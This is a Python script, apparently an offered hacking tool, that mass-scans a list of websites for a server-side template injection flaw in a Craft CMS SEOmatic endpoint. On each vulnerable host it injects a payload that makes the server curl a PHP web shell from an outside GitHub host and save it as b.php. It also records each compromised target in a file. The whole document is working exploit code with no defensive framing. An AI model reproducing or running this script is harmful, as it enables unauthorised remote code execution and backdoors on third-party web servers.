############################################################################################################################
# Tools SSTI to RCE Auto Upload Shell recoder by Adit Arlos   Author By Sendal.py                                                                               #
# Usage python3 filename.py list.txt -ip(if the targets are ip ex: 127.0.0.1)                                              #
# Usage python3 filename.py list.txt -w(if the targets are with http or https ex: http://asu.com and http://127.0.0.1)     #
############################################################################################################################

import requests as req
import sys
import re

user_agent = {"User-Agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"}
path = "/actions/seomatic/meta-container/meta-link-container/?uri="
payloadTest = '{{"pwnd"}}'
gas = "{{craft.app.view.evaluateDynamicContent('print(system(\"curl\x20https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php > b.php\"));')}}"
def mainIP(target):
    global suck
    try:
      res = req.get("http://"+target+path+payloadTest, headers = user_agent)
      status = res.status_code
      rArray = re.split("\\\|/", res.text)
      if status != 200:
        print("\x1b[1;31m[X] http://{} >>".format(target), status)
      elif "pwnd" not in rArray:
        print("\x1b[1;31m[X] http://{} >> gak pulen asu".format(target))
      else:
        print("\x1b[1;32m[>] http://{} >> pulen nih gan\ngaslah anjing".format(target))
        req.get("http://"+target+path+gas, headers=user_agent)
        open('vuln.txt','a+').write(target+'\n')
    except req.exceptions.RequestException:
      print("\x1b[1;33m[>] http://{} >> koneksi error".format(target))
def mainWeb(target):
    try:
      res = req.get(target+path+payloadTest, headers = user_agent)
      status = res.status_code
      rArray = re.split("\\\|/", res.text)
      if status != 200:
        print("\x1b[1;31m[X] {} >>".format(target), status)
      elif "pwnd" not in rArray:
        print("\x1b[1;31m[X] {} >> gak pulen asu".format(target))
      else:
        print("\x1b[1;32m[>] {} >> pulen nih gan\ngaslah anjing".format(target))
        req.get(target+path+gas, headers=user_agent)
        open('vuln.txt','a+').write(target+'\n')
    except req.exceptions.RequestException:
      print("\x1b[1;33m[>] {} >> koneksi error".format(target))

if __name__ == '__main__':
    filename = sys.argv[1]
    if sys.argv[2] == '-ip':   
      with open(filename) as f:
         lines = [line.rstrip() for line in f]
      for i in lines:
          mainIP(i)
    elif sys.argv[2] == '-w':
      with open(filename) as f:
         lines = [line.rstrip() for line in f]
      for i in lines:
          mainWeb(i)
    
